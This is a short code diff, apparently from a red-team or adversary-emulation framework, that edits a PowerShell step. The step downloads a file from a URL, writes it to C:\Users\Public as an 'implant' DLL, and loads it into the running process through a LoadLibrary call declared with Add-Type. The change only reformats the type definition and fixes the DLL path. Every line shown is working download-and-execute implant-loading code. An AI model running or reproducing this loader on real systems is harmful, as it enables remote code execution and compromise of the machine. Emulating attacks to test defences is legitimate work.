@@ -202,13 +202,5 @@
               $data=$wc.DownloadData($url);
               rm -force "C:\Users\Public\#{agents.implant_name}.dll" -ea ignore;
               [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.dll",$data) | Out-Null;
-              Add-Type -TypeDefinition @"
-                  using System;
-                  using System.Runtime.InteropServices;
-
-                  public static class Kernel32 {
-                      [DllImport("Kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
-                      public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
-                  }
-              "@;
-              $handle = [Kernel32]::LoadLibrary("#{agents.implant_name}.dll")
+              Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public static class Kernel32 { [DllImport("Kernel32", SetLastError=true, CharSet = CharSet.Ansi)] public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName); }';
+              $handle = [Kernel32]::LoadLibrary("C:\Users\Public\#{agents.implant_name}.dll");
